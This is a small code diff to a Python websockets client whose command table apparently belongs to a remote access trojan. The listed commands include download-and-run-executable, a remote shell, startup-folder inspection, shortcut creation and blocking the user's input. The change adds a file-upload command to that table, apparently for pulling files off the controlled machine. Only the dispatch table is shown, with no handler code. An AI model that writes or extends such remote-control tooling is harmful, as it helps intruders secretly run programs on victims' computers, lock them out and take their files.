@@ -6,6 +6,7 @@ import websockets
 
 class Command(Enum):
     # File System Commands
+    UPLOAD_FILE = "UPLOAD_FILE"
     DOWNLOAD_FILE_HTTP = "DOWNLOAD_FILE_HTTP"
     DOWNLOAD_RUN_EXE = "DOWNLOAD_RUN_EXE"
     GET_START_UP_CONTENTS = "GET_START_UP_CONTENTS"
@@ -131,6 +132,7 @@ command_to_module_map = {
     # File System Commands
     Command.DOWNLOAD_FILE_HTTP: "download",
     Command.DOWNLOAD_RUN_EXE: "download",
+    Command.UPLOAD_FILE: "download",
     
     Command.GET_START_UP_CONTENTS: "file_system",
     Command.CHDIR: "file_system",
@@ -143,6 +145,7 @@ command_to_module_map = {
     Command.MAKE_SHORTCUT: "file_system",
     Command.MOVE_FILE: "file_system",
     Command.SHELL: "file_system",
+
 
     Command.BLOCK: "block_input",
     Command.UNBLOCK: "block_input",
